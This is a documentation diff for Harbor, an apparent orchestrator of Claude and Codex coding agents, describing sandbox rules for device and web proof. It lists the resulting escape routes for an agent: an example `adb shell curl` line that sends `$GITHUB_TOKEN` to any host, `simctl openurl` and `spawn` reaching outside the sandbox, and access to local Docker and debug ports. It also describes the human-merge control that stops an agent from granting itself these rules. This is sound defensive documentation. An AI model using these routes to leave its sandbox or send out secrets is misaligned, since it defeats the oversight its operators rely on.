@@ -154,7 +154,7 @@ model = "gpt-6-luna"
 | `[hooks.*]` | readiness at `pre_handoff`/`pre_merge`, decision policy at `blocker` | script or skill hooks |
 | `[checks.*]` | none | optional repository commands the skill runs with `harbor workflow checks` |
 | `[github]` | `transport = "rest"` | how the builder reads and writes GitHub: `rest` (built-in helper) or opt-in `mcp` |
-| `[builder]` | absent (off) | opt-in `device_proof` platforms that widen a Claude builder's sandbox for emulator, simulator and browser proof |
+| `[builder]` | absent (off) | opt-in `device_proof` platforms that give a Claude builder paths out of its sandbox for emulator, simulator and local web proof; changes always need a human merge |
 
 Readiness gates only on facts Harbor can verify itself: fresh evidence, hold
 state, PR identity, mergeability and CI (plus feedback when set to `required`).
@@ -380,73 +380,146 @@ To allow them, list the platforms in your workflow copy:
 device_proof = ["android", "ios", "web"]   # any subset; absent or [] means off
 ```
 
-Each platform adds exactly one Claude Code sandbox rule:
+Each platform adds one Claude Code sandbox rule:
 
-| Platform | Adds | What it allows |
+| Platform | Adds | What it is for |
 | --- | --- | --- |
-| `android` | `network.allowLocalBinding = true` | Bash commands may listen on and connect to local ports, so `adb` can start or reach its server |
-| `web` | `network.allowLocalBinding = true` | the same rule, for dev servers (`http.server`, Metro, Expo, Next) and clients such as `curl` that fetch them |
-| `ios` | `network.allowMachLookup = ["com.apple.CoreSimulator.*"]` | Bash commands may reach the iOS Simulator services, so `xcrun simctl` can list, boot and screenshot simulators |
+| `android` | `network.allowLocalBinding = true` | the `adb` client reaches the adb server on `127.0.0.1:5037` (and can start it) |
+| `web` | `network.allowLocalBinding = true` | dev servers (`http.server`, Metro, Expo, Next) bind a local port, and clients such as `curl` fetch it |
+| `ios` | `network.allowMachLookup = ["com.apple.CoreSimulator.CoreSimulatorService", "com.apple.CoreSimulator.SimLaunchHost-arm64"]` (`-x86` on an Intel Mac) | `xcrun simctl list`, `install`, `launch` and `io booted screenshot` on a booted simulator |
 
-Nothing else changes. The sandbox stays on with `failIfUnavailable = true` and
-`allowUnsandboxedCommands = false`. The host allowlist, the writable paths and
-every other protection are the same as without the section. Harbor never adds
-`allowAppleEvents`, `allowUnixSockets`, `allowAllUnixSockets`,
-`excludedCommands` or `filesystem.disabled`. No extra writable path was
-needed: `simctl io booted screenshot <path>` writes inside the worktree, and
-adb reads its existing key in `~/.android`.
+The iOS names were found live, not guessed. A sandboxed Claude builder had
+every other CoreSimulator service denied. With `CoreSimulatorService` alone,
+the booted simulator showed `liblaunch_sim.dylib could not be opened`, and
+`simctl install booted` said `No devices are booted`. Adding the host's
+`SimLaunchHost` made install, launch and screenshot work. `simdiskimaged`,
+`SimulatorTrampoline`, `SimRenderingServices.*` and
+`SimAudioProcessorServices.*` were not needed, so they are not granted. Only
+the arm64 name was verified, on an Apple silicon Mac.
 
-**Security trade-off.** Read this before enabling a platform.
+**Harbor boots the devices, not the builder.** The sandbox cannot be
+narrowed enough to boot devices:
+- An emulator registers Mach services (`bootstrap_check_in`).
+- Booting a simulator needs more CoreSimulator access than the rules above.
 
-- `allowLocalBinding` lets every Bash command, not only adb or the dev server,
-  open listening sockets and connect to any port on this machine's loopback
-  interface. That includes other local services, such as a database, a
-  dashboard or another tool's local API. Claude Code's rule is
-  `(local ip "*:*")`, so a server the builder starts may also be reachable from
-  your network if it binds `0.0.0.0` instead of `127.0.0.1`. External hosts
-  stay blocked.
-- `com.apple.CoreSimulator.*` lets Bash commands ask CoreSimulatorService to
-  act for them. The service runs outside the sandbox, so a builder can boot,
-  erase, install apps on or delete any simulator of the user running Harbor.
-- The builder edits the ticket worktree, not `.harbor/workflow` in your main
-  checkout, so it cannot grant these rules to itself. A change to
-  `[builder]` lands only through a merged PR you review.
+So before each launch of a builder with `android` or `ios`, Harbor, running
+outside the sandbox, makes sure one device per platform is up:
+- **Android:** an attached device is used as is. Otherwise Harbor starts the
+  adb server and boots the first AVD by name with
+  `emulator -avd <name> -no-snapshot-save`, then waits up to 4 minutes for
+  `sys.boot_completed`. The emulator keeps running afterwards.
+- **iOS:** a booted simulator is used as is. Otherwise Harbor runs
+  `xcrun simctl boot` and `bootstatus -b` on the first available iPhone of
+  the newest iOS runtime.
 
-**Fail-closed.** An unknown platform (`"andriod"`), a repeated platform, a
-value that is not a list of strings, or another key in `[builder]` makes the
-workflow invalid. `harbor start` refuses the project, and `harbor doctor`
-exits 2 with the reason. Absent or empty, the generated `--settings` are
-byte-for-byte what they were before this option existed.
+Harbor prints the result to its log and appends it to the builder's prompt.
+When a boot fails, the prompt quotes the literal error and tells the builder
+to report it as a blocker instead of working around the sandbox. To use a
+particular device, boot it yourself before Harbor launches the builder.
 
-**Doctor.** For a Claude project, `harbor doctor` prints
-`Device proof: off (...)`, or the enabled platforms and one `grants ...` line
-per rule. The section is read with the rest of the workflow on every builder
-launch, so an edit applies on the next turn.
+**What you are trusting the builder with.** Every platform gives the builder's
+commands a path out of the sandbox. The sandbox flags stay set
+(`failIfUnavailable`, `allowUnsandboxedCommands = false`), and the host
+allowlist and writable paths do not change. Even so, a builder with these
+rules can reach hosts and files the sandbox would otherwise block:
 
-**Linux.** Claude Code documents `allowLocalBinding` and `allowMachLookup` as
-macOS-only, and Linux has no iOS Simulator. On Linux, `harbor doctor`
-adds `not effective on this host: ...`, and `harbor start` prints the same
-warning once, instead of silently doing nothing. Harbor has not been run on
-Linux with this option.
+- **`android`.** adb talks to a device that runs outside the sandbox.
+  `adb shell curl https://any-host/?t=$GITHUB_TOKEN` reaches any host, with
+  anything the builder can read in the request. `adb push` and `adb pull` move
+  worktree files on and off the device.
+- **`ios`.** CoreSimulatorService runs outside the sandbox and acts for the
+  builder. `xcrun simctl openurl booted https://any-host/...` reaches any host.
+  A probe with only `CoreSimulatorService` allowed ran `simctl openurl`
+  successfully. `xcrun simctl spawn` of a binary the
+  builder compiled for the simulator runs code outside the sandbox, with
+  access to the host filesystem. Treat `ios` as a sandbox escape. It can also
+  install, erase or delete any simulator of the user running Harbor.
+- **`web` (and `android`, which uses the same rule).** `allowLocalBinding`
+  lets every Bash command connect to any local port, not only the dev server.
+  That includes:
+  - the adb server;
+  - Chrome remote-debugging ports;
+  - a Docker TCP socket, which is host root;
+  - databases and other local APIs.
+
+  It also lets the builder listen on `0.0.0.0`, so a server it starts can be
+  reachable from your network.
+
+**Who should enable it.** Enable a platform only when both are true:
+- the machine running Harbor holds nothing the builder must not reach, such
+  as other projects' credentials, a Docker daemon or browsers with debugging
+  ports open;
+- you would accept the builder acting with your user's network access.
+
+A dedicated machine or user account for Harbor is the safe setup. Do not
+enable it on a shared workstation, on a machine with production credentials,
+or for repositories whose tickets come from people you do not trust to steer
+the builder.
+
+**A change to `[builder]` always needs a human merge.** The builder edits the
+ticket worktree, not `.harbor/workflow` in your main checkout, so it cannot
+grant itself these rules for its current run. It could open a PR that adds
+them. To stop that PR merging without you:
+- At `pre_merge`, Harbor compares `[builder]` in
+  `.harbor/workflow/workflow.toml` at the PR head with the merge base on
+  `origin/<base_branch>`.
+- If the table was added, changed or removed, the check fails with
+  `human merge required: the PR changes [builder] ...`, whatever
+  `merge_mode` and `auto_merge_risks` say.
+- If Harbor cannot read the diff (no worktree, head or base it cannot resolve,
+  or a workflow it cannot parse), it fails with
+  `human merge required: Harbor could not read the PR diff ...`.
+- The check runs in the bundled readiness hook and again in
+  `harbor workflow check` itself, so replacing the hook does not remove it.
+
+**Fail-closed config.** An unknown platform (`"andriod"`), a repeated
+platform, a value that is not a list of strings, or another key in `[builder]`
+makes the workflow invalid. `harbor start` refuses the project, and
+`harbor doctor` exits 2 with the reason. Absent or empty, the generated
+`--settings` are byte-for-byte what they were before this option existed, and
+Harbor boots nothing.
+
+**Doctor.** `harbor doctor` uses the same decision as the builder launcher.
+It reports the grant whenever any Claude builder of the project could run with
+it:
+- `builder_provider: claude`;
+- either side of a `[quota_fallback]` builder pair;
+- a retained Claude builder session in the ledger, which resumes on Claude
+  even after the project switches to Codex.
+
+It prints `Device proof: <platforms> · applies to Claude builders (<why>)`
+and one `grants ...` line per rule. With Claude possible and nothing
+configured, it prints `Device proof: off (...)`. The section is read with the
+rest of the workflow on every builder launch, so an edit applies on the next
+turn.
+
+**Linux.** Claude Code's settings documentation describes `allowLocalBinding`
+and `allowMachLookup` as macOS-only, and there is no iOS Simulator on Linux.
+On a non-macOS host, `harbor doctor` adds `not effective on this host: ...`,
+and `harbor start` prints the same warning once. Harbor has not been tested
+with this option on Linux.
 
 **Codex builders.** `device_proof` does not change a Codex builder. Harbor
 already runs Codex with `workspace-write` and network access. Under that
 sandbox, `adb start-server`, `adb devices` and a `127.0.0.1` HTTP server plus
 `curl` worked without any change. Codex has no setting for Mach services, so
 `xcrun simctl` fails there (`CoreSimulatorService connection became invalid`)
-and cannot be enabled. With `[builder]` set on a Codex project,
-`harbor doctor` prints `Device proof: not applied (...)` and `harbor start`
-warns once.
+and cannot be enabled. When `[builder]` is set and a Codex builder could run,
+`harbor doctor` prints `Device proof: not applied to Codex builders (...)`
+and `harbor start` warns once.
 
-**Proof scope.** Verified on macOS with Claude Code 2.1.332 and Codex CLI
-0.170.0. Live haiku builder sessions used Harbor's exact builder argv, and
-`codex sandbox` used an equivalent permission profile. Not verified: Linux, or an attached Android
-emulator (none was running, so adb listed no devices). A Playwright browser
-inside the Claude sandbox is not covered either: loading `playwright-core`
-1.58 hung there with `web` enabled, so `web` grants only local ports and
-Harbor adds no Mach services for a browser. Until that is verified, take
-browser screenshots with Harbor's Codex `playwright_browser_image` or outside
-the builder.
+**Proof scope.** Verified on an Apple silicon Mac with Claude Code 2.1.332 and
+Codex CLI 0.170.0. Live haiku builder sessions used Harbor's exact builder
+argv. `codex sandbox` used an equivalent permission profile. Not verified:
+- Linux;
+- an Intel Mac (the `SimLaunchHost-x86` name);
+- Harbor's emulator boot and `adb exec-out screencap` against a running
+  emulator (no emulator was running, and starting one was not permitted in
+  the verification session);
+- a Playwright browser inside the Claude sandbox. Loading `playwright-core`
+  1.58 hung there with `web` enabled, so `web` grants only local ports. Until
+  that is verified, take browser screenshots with Harbor's Codex
+  `playwright_browser_image` or outside the builder.
 
 ### Editing mid-run
 
@@ -670,7 +743,7 @@ against a throwaway repository and worktree; not run on Linux.
 | Watchdog | watchdog.py, db.py | test_watchdog.py |
 | Bounded decisions | unblock.py, decision_policy.py, risk_evidence.py | test_decision_policy.py, test_blocker_recovery.py, test_workflow_evidence.py |
 | Cleanup | workflow_lifecycle.py, worktree.py | test_workflow_cleanup_policy.py, test_merge_cleanup.py |
-| Device and browser proof | config/workflow.py, runner/claude.py, cli.py | test_device_proof.py |
+| Device and browser proof | config/workflow.py, runner/claude.py, device_proof.py, device_boot.py, readiness.py, cli.py | test_device_proof.py |
 
 Run `uv run pytest`, `uv run python -m compileall -q src tests` and `uv build`.
 The tests use mock external tickets and real local subprocesses and Git
